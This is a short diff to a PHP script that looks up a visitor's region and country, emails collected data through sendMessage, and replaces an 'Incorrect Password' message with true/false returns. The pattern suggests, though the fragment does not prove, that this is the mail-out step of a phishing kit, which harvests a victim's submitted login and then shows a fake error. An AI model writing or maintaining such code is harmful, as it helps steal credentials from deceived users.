@@ -91,10 +91,11 @@ $country = $geo['geoplugin_regionName'].", ".$geo['geoplugin_countryName'];
 		";
 
 	if($email->sendMessage($mail, $data)){
-		echo "Incorrect Password";
-	}else{
-		echo "Something went wrong";
-	}
-
+    return true;
+    exit;
+} else {
+    return false;
+    exit;
+}
 }
 ?>
